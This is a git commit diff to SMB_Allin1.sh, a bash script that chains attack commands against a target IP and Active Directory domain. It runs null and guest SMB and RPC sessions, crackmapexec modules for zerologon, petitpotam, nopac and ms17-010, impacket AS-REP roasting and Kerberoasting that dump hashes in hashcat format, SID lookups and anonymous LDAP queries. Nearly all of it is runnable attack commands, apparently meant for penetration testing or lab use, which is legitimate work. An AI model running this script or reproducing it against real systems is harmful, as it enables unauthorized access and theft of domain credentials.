bfb51a4886aeb379bee703692be1c7b7d2c5a796
youssef ennaciri <95150458+ydy4@users.noreply.github.com>
2022-05-19 14:38:54 +0100

    Update SMB_Allin1.sh

--- SMB_Allin1.sh
+++ SMB_Allin1.sh
@@ -1,3 +1,4 @@
+#SMB_ALLin1.sh
 #take some inputs
 if [ $# -lt 3 ]
         then
@@ -27,8 +28,8 @@ echo "${BLUE} smbmap -H $IP -u guest -p '' ${ENDCOLOR}"
 smbmap -H $IP -u guest -p ''
 echo "${BLUE} smbclient -N -L //$IP ${ENDCOLOR}"
 smbclient -N -L //$IP
-echo "${BLUE} smbclient -U 'Guest' -L //$IP${ENDCOLOR}"
-smbclient -U 'Guest' -L //$IP
+echo "${BLUE} smbclient -U 'Guest' -L //$IP --no-pass ${ENDCOLOR}"
+smbclient -U 'Guest' -L //$IP --no-pass
 echo "${BLUE} smbclient -N //$IP/ --option="client min protocol"=LANMAN1 ${ENDCOLOR}"
 smbclient -N //$IP/ --option="client min protocol"=LANMAN1
 echo "${BLUE} crackmapexec smb $IP ${ENDCOLOR}"
@@ -39,13 +40,26 @@ echo "${BLUE} crackmapexec smb $IP --shares -u "" -p "" ${ENDCOLOR}"
 crackmapexec smb $IP --shares -u "" -p ""
 echo "${BLUE} crackmapexec smb $IP -u "guest" --shares ${ENDCOLOR}"
 crackmapexec smb $IP -u "guest" --shares
+echo "${BLUE} crackmapexec smb $IP -u 'user' -p 'pass' -M nopac  ${ENDCOLOR}"
+#crackmapexec smb <ip> -u 'user' -p 'pass' -M nopac 
+echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M petitpotam  ${ENDCOLOR}"
+crackmapexec smb $IP -u '' -p '' -M petitpotam 
+echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M zerologon ${ENDCOLOR}"
+crackmapexec smb $IP -u '' -p '' -M zerologon 
+echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M ms17-010 ${ENDCOLOR}"
+crackmapexec smb $IP -u '' -p '' -M ms17-010   
+echo "${BLUE} crackmapexec smb $IP -u '' -p '' -M ioxidresolver ${ENDCOLOR}"
+crackmapexec smb $IP -u '' -p '' -M ioxidresolver
+
 echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~RPC Stuff~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
-echo "${BLUE} rpcclient $IP ${ENDCOLOR}"
-rpcclient $IP
-echo "${BLUE} rpcclient -U "" $IP ${ENDCOLOR}"
-rpcclient -U "" $IP
-echo "${BLUE} rpcclient -U "Guest" $IP ${ENDCOLOR}"
-rpcclient -U "Guest" $IP
+echo "${BLUE} rpcclient $IP --no-pass ${ENDCOLOR}"
+rpcclient $IP --no-pass
+echo "${BLUE} rpcclient -U "" $IP --no-pass ${ENDCOLOR}"
+rpcclient -U "" $IP --no-pass
+echo "${BLUE} rpcclient -U "Guest" $IP --no-pass ${ENDCOLOR}"
+rpcclient -U "Guest" $IP --no-pass
+echo "${BLUE} rpcclient -U "Guest" -P "Guest" $IP ${ENDCOLOR}"
+rpcclient -U "Guest" -P "Guest" $IP 
 echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Impacket~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
 echo "${BLUE} GetADUsers.py -dc-ip $IP $Domain_Name/ -all ${ENDCOLOR}"
 GetADUsers.py -dc-ip $IP "$Domain_Name/" -all
@@ -53,5 +67,21 @@ echo "${BLUE} GetNPUsers.py -dc-ip $IP -request "$Domain_Name/" -usersfile $Vali
 GetNPUsers.py -dc-ip $IP -request "$Domain_Name/" -usersfile $Valide_users -format hashcat
 echo "${BLUE} GetUserSPNs.py -dc-ip $IP -request "$Domain_Name/" ${ENDCOLOR}"
 GetUserSPNs.py -dc-ip $IP -request "$Domain_Name/"
+echo "${BLUE} lookupsid.py guest@$IP --no-pass${ENDCOLOR}"
+lookupsid.py guest@$IP --no-pass
 echo "${BLUE} getArch.py -target $IP ${ENDCOLOR}"
 getArch.py -target $IP
+
+echo "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~LDAP~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
+echo "${BLUE} ldapsearch -h $IP -x -s base namingcontexts ${ENDCOLOR}"
+ldapsearch -h $IP -x -s base namingcontexts
+
+#parse variables
+#Read the split words into an array based on space delimiter
+#IFS='.'
+#read -a strarr <<< "$Domain_Name"
+#set variables NT and LM
+#LM="${strarr[0]}"
+#NT="${strarr[1]}"
+#echo "${BLUE} ldapsearch -h $IP -x -b "dc=$LM,dc=$NT" ${ENDCOLOR}"
+#ldapsearch -h $IP -x -b "dc=$LM,dc=$NT"
